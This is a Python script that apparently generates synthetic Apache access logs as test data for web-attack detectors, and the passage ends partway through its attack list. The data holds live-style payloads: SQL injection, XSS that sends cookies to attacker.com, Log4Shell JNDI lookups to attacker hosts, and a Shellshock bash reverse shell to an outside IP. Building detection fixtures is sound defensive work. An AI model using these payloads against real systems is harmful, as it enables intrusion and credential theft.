#!/usr/bin/env python3
"""
Enterprise Apache Combined Access Log Generator for Scalp & Anathema.
Generates 105,000 realistic, coherent records spanning a 7-day cyber kill chain:
  - Day 1 (14/Oct/2024): Baseline Normal Business & Passive Recon (15,000 lines, 0.5% attacks)
  - Day 2 (15/Oct/2024): Active Directory Scanning & Info Disclosure (15,000 lines, 3% attacks)
  - Day 3 (16/Oct/2024): Classic Web Attacks: Traversal, LFI, XSS (15,000 lines, 7% attacks)
  - Day 4 (17/Oct/2024): Database Exploitation: SQLi & NoSQLi (15,000 lines, 10% attacks)
  - Day 5 (18/Oct/2024): High-Impact Exploitation: SSRF, Log4j, Shellshock, Spring, SSTI, RCE (15,000 lines, 12% attacks)
  - Day 6 (19/Oct/2024): Anti-Detection & Evasion Decoded by PayloadNormalizer (15,000 lines, 14% attacks)
  - Day 7 (20/Oct/2024): Coordinated Multi-Vector Campaign & Anathema Banning (15,000 lines, 16% attacks)

Format: Apache Combined Log Format:
  %h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"
"""
import datetime
from pathlib import Path
import random
import sys
import time

# Fixed seed for perfectly reproducible, deterministic generation
SEED = 20241014
random.seed(SEED)

LINES_PER_DAY = 15000
DAYS_COUNT = 7
TOTAL_LINES = LINES_PER_DAY * DAYS_COUNT  # 105,000 lines

BENIGN_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.6613.98 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.2792.65",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

ATTACK_USER_AGENTS = {
    "nikto": "Mozilla/5.00 (Nikto/2.1.6) (evasions:None) (test:Port Check)",
    "sqlmap": "sqlmap/1.7#stable (http://sqlmap.org)",
    "gobuster": "gobuster/3.5.0 (github.com/OJ/gobuster)",
    "nmap": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "shellshock": "() { :; }; /bin/cat /etc/passwd",
    "shellshock_rev": "() { :; }; /bin/bash -i >& /dev/tcp/91.240.118.172/4444 0>&1",
    "log4j_agent": "${jndi:ldap://attacker-command.net:1389/Exploit}",
    "log4j_obf": "${${lower:j}ndi:${lower:l}dap://198.51.100.99:1389/a}",
    "log4j_dns": "${jndi:dns://c2.evil-log4j.org/leak}",
    "struts_xwork": "User-Agent: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}",
}

BENIGN_CLIENT_IPS = [
    "192.0.2.14", "192.0.2.45", "192.0.2.89", "192.0.2.112",
    "198.51.100.10", "198.51.100.44", "198.51.100.87", "198.51.100.155",
    "203.0.113.19", "203.0.113.52", "203.0.113.104", "203.0.113.201",
    "10.10.45.12", "172.16.8.99",
    "2001:db8:85a3::8a2e:370:7334", "2001:db8:1f70::999", "2001:db8:acad::1", "2001:db8:cafe:1234::56",
]

ATTACKER_IPS = {
    "apt_scanner": "185.220.101.5",        # Persistent scanner probing env/git/cpanel/Anathema
    "sqlmap_bot": "45.154.255.89",         # SQLi burst attacker
    "ssrf_actor": "194.26.29.114",         # Cloud metadata SSRF explorer
    "rce_gang": "91.240.118.172",          # Shellshock / Command injection / RCE
    "log4j_crawler": "193.163.125.66",     # Massive JNDI Log4j scan across headers
    "modern_vector": "185.191.171.42",     # NoSQL, Prototype Pollution, SSTI, Spring
    "ipv6_actor": "2001:db8:dead:beef::1", # IPv6 targeted attacker
}

BENIGN_ENDPOINTS = [
    # App 1: E-Commerce Storefront
    ("GET", "/store/", 200, 8420, "https://example.com/", "Storefront Home"),
    ("GET", "/store/catalog?category=electronics&page=1", 200, 15400, "https://example.com/store/", "Catalog Electronics 1"),
    ("GET", "/store/catalog?category=electronics&page=2", 200, 14950, "https://example.com/store/catalog?category=electronics&page=1", "Catalog Electronics 2"),
    ("GET", "/store/catalog?category=clothing&sort=price_asc", 200, 12890, "https://example.com/store/", "Catalog sort"),
    ("GET", "/store/catalog?category=home&filter=in_stock", 200, 11400, "https://example.com/store/", "Catalog Home"),
    ("GET", "/store/product/49821?ref=home_promo", 200, 9420, "https://example.com/store/catalog", "Product View 49821"),
    ("GET", "/store/product/10042", 200, 8910, "https://example.com/store/catalog", "Product View 10042"),
    ("GET", "/store/product/88123", 200, 9150, "https://example.com/store/catalog", "Product View 88123"),
    ("GET", "/store/product/33219", 200, 7830, "https://example.com/store/catalog", "Product View 33219"),
    ("POST", "/store/cart/add", 302, 245, "https://example.com/store/product/49821", "Add to Cart"),
    ("GET", "/store/cart", 200, 6120, "https://example.com/store/product/49821", "Cart View"),
    ("POST", "/store/cart/update", 302, 220, "https://example.com/store/cart", "Update Cart"),
    ("GET", "/store/checkout", 200, 7840, "https://example.com/store/cart", "Checkout"),
    ("POST", "/store/checkout/pay", 200, 1850, "https://example.com/store/checkout", "Payment Processing"),
    ("GET", "/store/checkout/success?order_id=98214", 200, 5420, "https://example.com/store/checkout", "Order Success"),
    ("GET", "/static/css/theme.min.css?v=3.4.1", 200, 34210, "https://example.com/store/", "Static CSS"),
    ("GET", "/static/css/bootstrap.min.css", 304, 0, "https://example.com/store/", "Static CSS 304"),
    ("GET", "/static/js/bundle.vendor.js", 200, 142050, "https://example.com/store/", "Static JS Vendor"),
    ("GET", "/static/js/app.min.js?hash=9f82d1", 200, 48200, "https://example.com/store/", "Static JS App"),
    ("GET", "/static/images/hero-banner.webp", 200, 95400, "https://example.com/store/", "Banner Image"),
    ("GET", "/static/images/logo.svg", 304, 0, "https://example.com/store/", "Logo"),
    ("GET", "/favicon.ico", 200, 1150, "-", "Favicon"),
    ("GET", "/robots.txt", 200, 420, "-", "Robots"),
    ("GET", "/sitemap.xml", 200, 15420, "-", "Sitemap"),

    # App 2: Modern Microservices API & Mobile Backend
    ("GET", "/api/v1/health", 200, 142, "-", "API Health"),
    ("GET", "/api/v2/user/me", 200, 890, "https://app.example.com/", "User profile"),
    ("GET", "/api/v2/user/preferences", 200, 640, "https://app.example.com/", "User preferences"),
    ("GET", "/api/v2/notifications?unread=true&limit=10", 200, 1450, "https://app.example.com/", "Notifications"),
    ("GET", "/api/v2/orders?status=shipped&offset=0&limit=25", 200, 4520, "https://app.example.com/", "Orders API"),
    ("POST", "/api/v2/auth/refresh", 200, 310, "https://app.example.com/", "Token refresh"),
    ("GET", "/api/v2/search?q=laptop+sleeve&category=accessories", 200, 3210, "https://app.example.com/", "API Search"),
    ("GET", "/api/v2/inventory/status?sku=SKU-9812", 200, 410, "https://app.example.com/", "Inventory check"),
    ("POST", "/api/v2/analytics/event", 204, 0, "https://app.example.com/", "Analytics ping"),

    # App 3: Corporate Enterprise Portal
    ("GET", "/portal/login", 200, 4310, "-", "Portal Login"),
    ("POST", "/portal/auth/login", 302, 340, "https://corp.example.com/portal/login", "Portal Auth Post"),
    ("GET", "/portal/dashboard", 200, 16800, "https://corp.example.com/portal/login", "Portal Dashboard"),
    ("GET", "/portal/documents/guide.pdf", 200, 450210, "https://corp.example.com/portal/dashboard", "Doc PDF"),
    ("GET", "/portal/reports/2024/summary.html", 200, 24100, "https://corp.example.com/portal/dashboard", "Report Summary"),
    ("GET", "/portal/announcements/q4", 200, 9500, "https://corp.example.com/portal/dashboard", "Announcements"),
    ("GET", "/portal/employees/directory?dept=eng", 200, 18400, "https://corp.example.com/portal/dashboard", "Staff Directory"),

    # App 4: Legacy Blog / Community Forum
    ("GET", "/blog/", 200, 11200, "-", "Blog Index"),
    ("GET", "/blog/page/2", 200, 10800, "https://example.com/blog/", "Blog Page 2"),
    ("GET", "/blog/post/welcome-to-our-new-architecture", 200, 18500, "https://example.com/blog/", "Blog Post Arch"),
    ("GET", "/blog/post/securing-cloud-infrastructure", 200, 22100, "https://example.com/blog/", "Blog Post Cloud"),
    ("GET", "/blog/post/quarterly-engineering-update", 200, 16400, "https://example.com/blog/", "Blog Post Update"),
    ("GET", "/forum/index.php", 200, 28400, "-", "Forum Home"),
    ("GET", "/forum/viewforum.php?f=2", 200, 31200, "https://example.com/forum/index.php", "Forum Subforum"),
    ("GET", "/forum/viewtopic.php?f=4&t=1928", 200, 21400, "https://example.com/forum/", "Forum Topic 1928"),
    ("GET", "/forum/viewtopic.php?f=4&t=2041", 200, 19800, "https://example.com/forum/", "Forum Topic 2041"),
    ("GET", "/forum/memberlist.php?mode=viewprofile&u=54", 200, 9400, "https://example.com/forum/", "Forum Profile"),
    ("POST", "/forum/posting.php?mode=reply&t=1928", 302, 310, "https://example.com/forum/viewtopic.php?f=4&t=1928", "Forum Post Reply"),
]

# ==============================================================================
# ATTACK SCENARIOS PER KILL CHAIN PHASE (DAYS 1 to 7)
# ==============================================================================

# Day 1: Low-and-slow passive reconnaissance
DAY1_RECON_SCENARIOS = [
    {"method": "GET", "url": "/robots.txt", "status": 200, "bytes": 420, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Recon robots.txt probe"},
    {"method": "GET", "url": "/sitemap.xml", "status": 200, "bytes": 15420, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Recon sitemap.xml probe"},
    {"method": "GET", "url": "/.well-known/security.txt", "status": 200, "bytes": 310, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Recon security.txt"},
    {"method": "GET", "url": "/.well-known/assetlinks.json", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Recon assetlinks.json"},
    {"method": "GET", "url": "/.well-known/apple-app-site-association", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Recon apple app association"},
    {"method": "GET", "url": "/crossdomain.xml", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Recon crossdomain.xml"},
    {"method": "GET", "url": "/clientaccesspolicy.xml", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Recon clientaccesspolicy.xml"},
    {"method": "GET", "url": "/humans.txt", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Recon humans.txt"},
    {"method": "GET", "url": "/api/v1/openapi.json", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Recon OpenAPI schema probe"},
    {"method": "GET", "url": "/api/v1/swagger.json", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Recon Swagger json probe"},
    {"method": "GET", "url": "/store/search?q=admin+login", "status": 200, "bytes": 4120, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Recon site search query admin"},
    {"method": "GET", "url": "/blog/search?q=password+reset", "status": 200, "bytes": 3820, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Recon blog search password reset"},
]

# Day 2: Active Directory Scanning & Information Disclosure
DAY2_SCAN_SCENARIOS = [
    # Sensitive files & credentials
    {"method": "GET", "url": "/.env", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "agent": ATTACK_USER_AGENTS["nikto"], "desc": "Probe root .env"},
    {"method": "GET", "url": "/.env.local", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "agent": ATTACK_USER_AGENTS["nikto"], "desc": "Probe .env.local"},
    {"method": "GET", "url": "/.env.backup", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "agent": ATTACK_USER_AGENTS["gobuster"], "desc": "Probe .env.backup"},
    {"method": "GET", "url": "/.git/config", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "agent": ATTACK_USER_AGENTS["gobuster"], "desc": "Probe git config"},
    {"method": "GET", "url": "/.git/HEAD", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "agent": ATTACK_USER_AGENTS["gobuster"], "desc": "Probe git HEAD"},
    {"method": "GET", "url": "/.aws/credentials", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "agent": ATTACK_USER_AGENTS["nikto"], "desc": "Probe AWS credentials"},
    {"method": "GET", "url": "/.ssh/id_rsa", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "agent": ATTACK_USER_AGENTS["nikto"], "desc": "Probe SSH id_rsa private key"},
    {"method": "GET", "url": "/web.config", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Probe IIS web.config"},
    {"method": "GET", "url": "/docker-compose.yml", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Probe docker compose"},
    {"method": "GET", "url": "/backup.sql", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "agent": ATTACK_USER_AGENTS["gobuster"], "desc": "Probe database dump backup.sql"},

    # Spring Actuator & API Introspection
    {"method": "GET", "url": "/actuator/env", "status": 403, "bytes": 180, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Probe Spring Actuator env"},
    {"method": "GET", "url": "/actuator/heapdump", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Probe Spring Actuator heapdump"},
    {"method": "GET", "url": "/actuator/threaddump", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Probe Spring Actuator threaddump"},
    {"method": "GET", "url": "/actuator/metrics", "status": 403, "bytes": 180, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Probe Spring Actuator metrics"},
    {"method": "GET", "url": "/actuator/gateway/routes", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Probe Spring Actuator gateway"},
    {"method": "GET", "url": "/actuator/health", "status": 200, "bytes": 142, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Probe Spring Actuator health"},

    # Swagger & GraphQL Introspection
    {"method": "GET", "url": "/swagger-ui.html", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Probe Swagger UI html"},
    {"method": "GET", "url": "/swagger-ui/index.html", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Probe Swagger UI subpath"},
    {"method": "GET", "url": "/v2/api-docs", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Probe Springfox v2 api-docs"},
    {"method": "GET", "url": "/api-docs", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "Probe OpenAPI api-docs"},
    {"method": "GET", "url": "/graphql?query={__schema{types{name,fields{name}}}}", "status": 400, "bytes": 180, "ip": ATTACKER_IPS["apt_scanner"], "desc": "GraphQL schema introspection"},
    {"method": "POST", "url": "/graphql?query={__schema{queryType{name}}}", "status": 400, "bytes": 190, "ip": ATTACKER_IPS["apt_scanner"], "desc": "GraphQL queryType introspection"},

    # Directory Bruteforcing
    {"method": "GET", "url": "/admin/", "status": 403, "bytes": 280, "ip": ATTACKER_IPS["apt_scanner"], "agent": ATTACK_USER_AGENTS["gobuster"], "desc": "Bruteforce /admin/"},
    {"method": "GET", "url": "/administrator/", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "agent": ATTACK_USER_AGENTS["gobuster"], "desc": "Bruteforce /administrator/"},
    {"method": "GET", "url": "/manager/html", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "agent": ATTACK_USER_AGENTS["nikto"], "desc": "Bruteforce Tomcat manager"},
    {"method": "GET", "url": "/cpanel/", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "agent": ATTACK_USER_AGENTS["nikto"], "desc": "Bruteforce cpanel"},
    {"method": "GET", "url": "/console/", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "agent": ATTACK_USER_AGENTS["gobuster"], "desc": "Bruteforce H2/WebLogic console"},
]

# Day 3: Classic Web Attacks: Path Traversal, LFI & XSS
DAY3_CLASSIC_SCENARIOS = [
    # Directory Traversal & LFI
    {"method": "GET", "url": "/download.php?file=../../../../../../etc/passwd", "status": 403, "bytes": 310, "ip": ATTACKER_IPS["apt_scanner"], "desc": "DT /etc/passwd"},
    {"method": "GET", "url": "/download.php?file=../../../../../../etc/shadow", "status": 403, "bytes": 310, "ip": ATTACKER_IPS["apt_scanner"], "desc": "DT /etc/shadow"},
    {"method": "GET", "url": "/view_image.php?path=..%2f..%2f..%2f..%2fwindows%2fwin.ini", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "DT windows/win.ini encoded slashes"},
    {"method": "GET", "url": "/files.php?doc=../../../../boot.ini", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "DT boot.ini probe"},
    {"method": "GET", "url": "/index.php?page=php://filter/convert.base64-encode/resource=config.php", "status": 200, "bytes": 8420, "ip": ATTACKER_IPS["apt_scanner"], "desc": "LFI PHP wrapper filter base64 config"},
    {"method": "GET", "url": "/index.php?page=php://filter/resource=/etc/passwd", "status": 403, "bytes": 310, "ip": ATTACKER_IPS["apt_scanner"], "desc": "LFI PHP wrapper direct resource"},
    {"method": "GET", "url": "/file.php?f=php://input", "status": 403, "bytes": 240, "ip": ATTACKER_IPS["apt_scanner"], "desc": "LFI php://input wrapper"},
    {"method": "GET", "url": "/display.php?file=../../../../usr/local/apache2/conf/httpd.conf", "status": 403, "bytes": 280, "ip": ATTACKER_IPS["apt_scanner"], "desc": "DT Apache httpd.conf"},
    {"method": "GET", "url": "/logs.php?log=../../../../var/log/apache2/access.log", "status": 403, "bytes": 290, "ip": ATTACKER_IPS["apt_scanner"], "desc": "DT Apache access log LFI"},
    {"method": "GET", "url": "/portal/doc?path=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts", "status": 404, "bytes": 210, "ip": ATTACKER_IPS["apt_scanner"], "desc": "DT Windows hosts file backslashes"},

    # Reflected & DOM XSS
    {"method": "GET", "url": "/store/catalog?search=%3Cscript%3Ealert(document.cookie)%3C/script%3E", "status": 200, "bytes": 9410, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "XSS script cookie stealer"},
    {"method": "GET", "url": "/feedback?msg=%3Cimg%20src=x%20onerror=alert(1)%3E", "status": 200, "bytes": 4510, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "XSS img onerror alert(1)"},
    {"method": "GET", "url": "/forum/profile.php?user=%22%3E%3Csvg/onload=confirm(document.domain)%3E", "status": 200, "bytes": 6210, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "XSS SVG onload confirm"},
    {"method": "GET", "url": "/search?q=%27%3E%3Cscript%3Edocument.location=%27http://attacker.com/c?%27+document.cookie%3C/script%3E", "status": 200, "bytes": 5120, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "XSS location redirect cookie exfil"},
    {"method": "GET", "url": "/comments.php?text=%3Cbody%20onload=alert(%27XSS%27)%3E", "status": 200, "bytes": 3840, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "XSS body onload alert"},
    {"method": "GET", "url": "/store/reviews?prod=10&msg=%3Ciframe%20src=%22javascript:alert(1)%22%3E", "status": 200, "bytes": 7410, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "XSS iframe javascript url"},
    {"method": "GET", "url": "/blog/view?title=%3Ca%20href=%22javascript:alert(document.domain)%22%3EClick%3C/a%3E", "status": 200, "bytes": 8200, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "XSS a href javascript pseudoprotocol"},
    {"method": "GET", "url": "/portal/welcome?user=%22%20onfocus=%22alert(1)%22%20autofocus=%22", "status": 200, "bytes": 5400, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "XSS autofocus onfocus injection"},
    {"method": "GET", "url": "/forum/viewtopic.php?t=5%22%3E%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,49,41))%3C/script%3E", "status": 200, "bytes": 18200, "ip": ATTACKER_IPS["ipv6_actor"], "desc": "XSS eval String.fromCharCode"},
]

# Day 4: Database Exploitation: SQLi & NoSQLi
DAY4_DB_SCENARIOS = [
    # SQLMap Automated Bursts
    {"method": "GET", "url": "/store/product/view?id=42%20AND%201=1", "status": 200, "bytes": 9420, "ip": ATTACKER_IPS["sqlmap_bot"], "agent": ATTACK_USER_AGENTS["sqlmap"], "desc": "SQLMap boolean positive check"},
    {"method": "GET", "url": "/store/product/view?id=42%20AND%201=2", "status": 200, "bytes": 4120, "ip": ATTACKER_IPS["sqlmap_bot"], "agent": ATTACK_USER_AGENTS["sqlmap"], "desc": "SQLMap boolean negative check"},
    {"method": "GET", "url": "/store/product/view?id=42%27", "status": 500, "bytes": 740, "ip": ATTACKER_IPS["sqlmap_bot"], "agent": ATTACK_USER_AGENTS["sqlmap"], "desc": "SQLMap syntax error probe"},

    # UNION SELECT Credential Extraction
    {"method": "GET", "url": "/store/product/view?id=42%20UNION%20SELECT%201,username,password,4%20FROM%20users--", "status": 500, "bytes": 740, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "SQLi UNION SELECT credentials"},
    {"method": "GET", "url": "/store/catalog?cat=5%20UNION%20ALL%20SELECT%20NULL,table_name,column_name,NULL%20FROM%20information_schema.columns--", "status": 200, "bytes": 18200, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "SQLi schema columns extraction"},
    {"method": "GET", "url": "/api/v1/products?id=-1%20UNION%20SELECT%201,schema_name%20FROM%20information_schema.schemata--", "status": 200, "bytes": 6200, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "SQLi schemata extraction"},

    # Boolean-based Blind SQLi
    {"method": "GET", "url": "/forum/viewtopic.php?t=10%27%20OR%201=1--", "status": 200, "bytes": 15400, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "SQLi Boolean OR 1=1 bypass"},
    {"method": "GET", "url": "/store/catalog?cat=1%27%20OR%20%27a%27=%27a", "status": 200, "bytes": 12890, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "SQLi OR a=a tautology"},
    {"method": "GET", "url": "/login.php?user=admin%27%20AND%201=1--", "status": 200, "bytes": 4310, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "SQLi AND 1=1 auth probe"},
    {"method": "GET", "url": "/store/product/100?ref=promo%27%20OR%202>1--", "status": 200, "bytes": 8910, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "SQLi OR 2>1 parameter probe"},

    # Time-based Blind SQLi
    {"method": "GET", "url": "/store/catalog?search=shoes%27%20AND%20SLEEP(5)--", "status": 200, "bytes": 840, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "SQLi Time-based SLEEP(5)"},
    {"method": "GET", "url": "/api/v1/orders?id=1%20WAITFOR%20DELAY%20%270:0:5%27--", "status": 200, "bytes": 1200, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "SQLi WAITFOR DELAY SQL Server"},
    {"method": "GET", "url": "/store/items?id=10;SELECT%20pg_sleep(5)--", "status": 200, "bytes": 940, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "SQLi pg_sleep PostgreSQL"},

    # Blind Inference Queries
    {"method": "GET", "url": "/api/v1/users?id=1%20AND%20ASCII(SUBSTRING((SELECT%20password%20FROM%20users),1,1))=97", "status": 200, "bytes": 450, "ip": ATTACKER_IPS["sqlmap_bot"], "agent": ATTACK_USER_AGENTS["sqlmap"], "desc": "SQLi Blind inference ASCII SUBSTRING"},
    {"method": "GET", "url": "/store/user?id=1%20AND%20MID(VERSION(),1,1)=5", "status": 200, "bytes": 620, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "SQLi Blind inference MID VERSION"},
    {"method": "GET", "url": "/portal/account?id=1%20AND%20SUBSTR(user(),1,1)=%27r%27", "status": 200, "bytes": 890, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "SQLi Blind inference user character"},

    # Error-based SQLi
    {"method": "GET", "url": "/store/item?id=1%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20version())))", "status": 500, "bytes": 820, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "SQLi EXTRACTVALUE error based"},
    {"method": "GET", "url": "/search?q=1%20AND%20UPDATEXML(1,CONCAT(0x7e,user()),1)", "status": 500, "bytes": 810, "ip": ATTACKER_IPS["sqlmap_bot"], "desc": "SQLi UPDATEXML error based"},

    # NoSQL Injection Operators
    {"method": "GET", "url": "/api/v2/users?username[$ne]=admin&password[$gt]=", "status": 401, "bytes": 142, "ip": ATTACKER_IPS["modern_vector"], "desc": "NoSQL $ne / $gt bypass"},
    {"method": "GET", "url": "/api/v2/catalog/items?filter={%22$where%22:%22this.price%3E0%22}", "status": 500, "bytes": 523, "ip": ATTACKER_IPS["modern_vector"], "desc": "NoSQL $where execution"},
    {"method": "GET", "url": "/api/v2/customers?query[$regex]=^adm.*", "status": 200, "bytes": 890, "ip": ATTACKER_IPS["modern_vector"], "desc": "NoSQL $regex harvesting"},
    {"method": "GET", "url": "/api/v2/auth/login?user[$in][]=admin&user[$in][]=root&pass[$ne]=1", "status": 401, "bytes": 160, "ip": ATTACKER_IPS["modern_vector"], "desc": "NoSQL $in array operator auth probe"},
    {"method": "GET", "url": "/api/v2/orders?account[$exists]=true", "status": 200, "bytes": 2100, "ip": ATTACKER_IPS["modern_vector"], "desc": "NoSQL $exists operator probe"},
]

# Day 5: High-Impact Exploitation: SSRF, Log4Shell, Shellshock, Spring, SSTI, RCE
DAY5_HIGH_IMPACT_SCENARIOS = [
    # Cloud Metadata SSRF
    {"method": "GET", "url": "/api/v2/fetch-url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", "status": 403, "bytes": 310, "ip": ATTACKER_IPS["ssrf_actor"], "desc": "SSRF AWS metadata IAM role probe"},
    {"method": "GET", "url": "/proxy?url=http://169.254.169.254/latest/user-data", "status": 403, "bytes": 280, "ip": ATTACKER_IPS["ssrf_actor"], "desc": "SSRF AWS user-data probe"},
    {"method": "GET", "url": "/service/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", "status": 400, "bytes": 220, "ip": ATTACKER_IPS["ssrf_actor"], "desc": "SSRF GCP metadata internal DNS"},
    {"method": "GET", "url": "/api/v2/proxy?target=http://192.168.1.1/admin.html", "status": 403, "bytes": 240, "ip": ATTACKER_IPS["ssrf_actor"], "desc": "SSRF private subnet router probe"},
    {"method": "GET", "url": "/api/v1/preview?image=http://127.0.0.1:8080/actuator/env", "status": 403, "bytes": 210, "ip": ATTACKER_IPS["ssrf_actor"], "desc": "SSRF loopback 127.0.0.1 port 8080 probe"},

    # Log4Shell / JNDI Injections across URL, UA, Referer
    {"method": "GET", "url": "/search?q=${jndi:ldap://198.51.100.200:1389/Exploit}", "status": 400, "bytes": 350, "ip": ATTACKER_IPS["log4j_crawler"], "desc": "Log4Shell standard LDAP in URL"},
    {"method": "GET", "url": "/store/catalog?search=${${lower:j}ndi:${lower:l}dap://198.51.100.99:1389/a}", "status": 400, "bytes": 320, "ip": ATTACKER_IPS["log4j_crawler"], "desc": "Log4Shell obfuscated lower URL"},
    {"method": "GET", "url": "/api/v2/auth/login", "status": 401, "bytes": 180, "ip": ATTACKER_IPS["log4j_crawler"], "agent": ATTACK_USER_AGENTS["log4j_agent"], "desc": "Log4Shell JNDI in User-Agent"},
    {"method": "GET", "url": "/api/v2/user/me", "status": 401, "bytes": 180, "ip": ATTACKER_IPS["log4j_crawler"], "agent": ATTACK_USER_AGENTS["log4j_obf"], "desc": "Log4Shell lower obfuscated UA"},
    {"method": "GET", "url": "/feedback", "status": 200, "bytes": 2400, "ip": ATTACKER_IPS["log4j_crawler"], "referer": "http://example.com/feedback?ref=${${lower:j}ndi:${lower:l}dap://evil.com/a}", "desc": "Log4Shell in Referer header"},
    {"method": "GET", "url": "/login?user=${jndi:dns://attacker-domain.com/token}", "status": 400, "bytes": 290, "ip": ATTACKER_IPS["log4j_crawler"], "agent": ATTACK_USER_AGENTS["log4j_dns"], "desc": "Log4Shell DNS protocol probe"},

    # Shellshock (CVE-2014-6271)
    {"method": "GET", "url": "/cgi-bin/test-cgi", "status": 500, "bytes": 740, "ip": ATTACKER_IPS["rce_gang"], "agent": ATTACK_USER_AGENTS["shellshock"], "desc": "Shellshock in User-Agent /bin/cat /etc/passwd"},
    {"method": "GET", "url": "/cgi-bin/status.sh", "status": 500, "bytes": 620, "ip": ATTACKER_IPS["rce_gang"], "agent": ATTACK_USER_AGENTS["shellshock_rev"], "desc": "Shellshock reverse shell attempt"},
